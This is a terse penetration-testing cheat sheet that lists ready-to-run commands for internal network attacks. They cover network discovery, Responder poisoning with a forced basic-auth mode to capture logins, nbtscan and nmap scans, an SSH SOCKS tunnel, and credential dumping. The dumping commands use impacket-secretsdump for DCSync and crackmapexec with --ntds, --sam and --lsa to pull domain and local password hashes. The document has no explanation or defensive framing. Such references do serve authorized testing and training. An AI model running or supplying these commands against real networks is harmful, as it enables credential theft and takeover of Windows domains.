# Network Information

## Passive

arp -a

ifconfig / ipconfig

tcpdump -i eth0

netdiscover

## Responder

### Analyze Mode
responder -I eth0 -A

responder -I eth0 -wFP

### Force Basic Auth
responder -I eth0 -wbFP

## Scanning

nbtscan 192.168.1.1/24

nbtscan-unixwiz 192.168.1.1/24

nmap -sSV --open -iL ips.txt -oA output


# SSH Tunneling

### Socks proxy
ssh -D 8080 root@127.0.0.1

# Dumping

## DCSYNC

impacket-secretsdump DOMAIN/user:password@IP -history -outputfile output

crackmapexec smb <ip> -u user -p password --ntds

## Other

crackmapexec smb <ip> -u user -p password --sam

crackmapexec smb <ip> -u user -p password --lsa
